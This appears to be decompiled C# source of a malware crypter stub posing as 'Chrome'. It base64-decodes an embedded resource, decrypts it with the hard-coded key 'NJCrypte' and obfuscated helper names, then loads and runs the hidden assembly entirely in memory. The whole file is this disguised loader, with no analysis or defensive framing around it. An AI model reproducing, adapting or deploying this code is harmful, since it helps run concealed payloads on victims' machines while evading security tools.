using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using Chrome.My.Resources;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsWithUI;

namespace Chrome;

[StandardModule]
internal sealed class Chrome
{
	[STAThread]
	public static void Main()
	{
		if (UnhandledExceptionHandlerWithUI.AttachApp())
		{
			string myurl = Resources.myurl;
			byte[] rawAssembly = 三月而死(Convert.FromBase64String(myurl), "NJCrypte");
			Assembly assembly = AppDomain.CurrentDomain.Load(rawAssembly);
			MethodInfo entryPoint = assembly.EntryPoint;
			object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
			object[] parameters = null;
			bool flag;
			if (flag = entryPoint.GetParameters().Length > 0)
			{
				parameters = new object[1] { new string[1] { null } };
			}
			entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters);
		}
	}

	public static byte[] 三月而死(byte[] data, string PP)
	{
		攘祛薄腋 攘祛薄腋2 = new 攘祛薄腋();
		return 攘祛薄腋2.Decrypt(data, Encoding.Default.GetBytes(PP));
	}
}
